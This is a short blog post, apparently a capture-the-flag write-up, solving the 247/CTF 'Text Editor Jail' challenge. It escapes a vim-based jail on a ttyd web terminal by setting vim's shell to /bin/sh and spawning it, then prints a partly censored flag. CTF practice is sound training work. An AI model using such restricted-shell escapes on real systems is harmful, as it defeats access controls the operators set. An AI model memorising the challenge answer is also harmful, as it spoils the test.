---
layout: post
title: 247/CTF - THE TEXT EDITOR JAIL
---

## Prompt
We didn't have time to setup and test a proper jail, so this text editor will have to do for now. Can you break free?

### Solution
This one is a pretty simple escape. We are dropped into vim over a `ttyd` web terminal. In case anyone hasn't seen it, check out [GTFOBins](https://gtfobins.github.io/gtfobins/vim/).
```
:set shell=/bin/sh
:shell
~ $ ls
run_for_flag
~ $ ./run_for_flag
247CTF{c69287be156{censored}cd3f2fcd8fa}
```
